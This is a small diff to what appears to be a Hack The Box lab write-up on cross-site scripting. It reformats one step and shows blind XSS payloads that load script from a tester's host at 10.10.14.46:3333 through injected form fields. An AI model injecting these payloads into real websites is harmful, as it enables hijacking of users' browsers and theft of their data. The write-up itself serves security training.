@@ -316,8 +316,8 @@ http://10.129.13.2/assessment
 ```
 ![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\1.png)
 
-Write the scripts in all the fields always putting a name to detect the vulnerable field.
-<div style="text-align: justify">33. </div>
+
+<div style="text-align: justify">33. Write the scripts in all the fields always putting a name to detect the vulnerable field.</div>
 ```javascript
 "><script src=http://10.10.14.46:3333/coment></script>
 "><script src=http://10.10.14.46:3333/name></script>
